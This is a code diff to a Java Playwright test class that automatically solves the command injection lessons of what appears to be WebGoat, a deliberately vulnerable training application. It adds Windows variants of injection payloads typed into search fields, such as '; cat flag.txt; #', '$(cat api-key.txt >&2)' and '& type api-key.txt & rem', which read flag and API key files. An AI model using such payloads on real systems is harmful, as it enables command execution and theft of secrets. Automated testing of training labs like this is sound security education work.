@@ -8,8 +8,14 @@ import com.microsoft.playwright.Locator;
 import com.microsoft.playwright.Page;
 import com.microsoft.playwright.PlaywrightException;
 import com.microsoft.playwright.options.WaitForSelectorState;
+import java.util.regex.Pattern;
 
 public class CommandInjectionLessonPage extends LessonPage {
+
+  private static final Pattern BUILD_TOKEN_PATTERN =
+      Pattern.compile("WEBGOAT_BUILD_TOKEN=[0-9a-fA-F-]{36}");
+  private static final Pattern FLAG_PATTERN = Pattern.compile("flag\\{[0-9a-fA-F-]{36}\\}");
+  private static final Pattern API_KEY_PATTERN = Pattern.compile("API_KEY=[0-9a-fA-F-]{36}");
 
   public CommandInjectionLessonPage(Page page) {
     super(page);
@@ -41,8 +47,7 @@ public class CommandInjectionLessonPage extends LessonPage {
     submitForm("#task2-form");
     waitForSpinner();
     var output = safeText(taskOutput("#task2-form"));
-    var token = output.substring(output.indexOf("=") + 1, output.length() - 1);
-    page.locator("#task2-form #token").fill("WEBGOAT_BUILD_TOKEN=" + token);
+    page.locator("#task2-form #token").fill(find(BUILD_TOKEN_PATTERN, output));
     submitForm("#task2-form");
   }
 
@@ -58,13 +63,17 @@ public class CommandInjectionLessonPage extends LessonPage {
     }
   }
 
-  public void solveTask3() {
+  public void solveTask3(boolean isWindows) {
     var page = getPage();
-    page.locator("#task3-search-form #title").fill("luna images/*; cat flag.txt; #");
+    String payload =
+        isWindows
+            ? "luna images\\*.txt & type flag.txt & rem"
+            : "luna images/*; cat flag.txt; #";
+    page.locator("#task3-search-form #title").fill(payload);
     submitForm("#task3-search-form");
     waitForSpinner();
     var console = safeText(page.locator("#cat-search-output .command-output"));
-    submitTask3Flag(console.substring(console.indexOf("flag{"), console.indexOf("}") + 1));
+    submitTask3Flag(find(FLAG_PATTERN, console));
   }
 
   public void submitTask3Flag(String flag) {
@@ -78,15 +87,18 @@ public class CommandInjectionLessonPage extends LessonPage {
     return taskFeedback("#task3-flag-form");
   }
 
-  public void solveTask4() {
+  public void solveTask4(boolean isWindows) {
     Page page = getPage();
-    page.locator("#task4-search-form #title-task4").fill("$(cat api-key.txt >&2)");
+    String payload =
+        isWindows
+            ? "luna images\\*.txt & type api-key.txt & rem"
+            : "$(cat api-key.txt >&2)";
+    page.locator("#task4-search-form #title-task4").fill(payload);
     submitForm("#task4-search-form");
     waitForSpinner();
 
     var console = safeText(page.locator("#cat-task4-output .command-output"));
-    int start = console.indexOf("API_KEY=");
-    submitTask4Key(console.substring(start).trim());
+    submitTask4Key(find(API_KEY_PATTERN, console));
   }
 
   private void submitTask4Key(String key) {
@@ -131,5 +143,13 @@ public class CommandInjectionLessonPage extends LessonPage {
   private String safeText(Locator locator) {
     String text = locator.textContent();
     return text == null ? "" : text;
+  }
+
+  private String find(Pattern pattern, String value) {
+    var matcher = pattern.matcher(value);
+    if (!matcher.find()) {
+      throw new IllegalStateException("Expected value not found in command output: " + value);
+    }
+    return matcher.group();
   }
 }
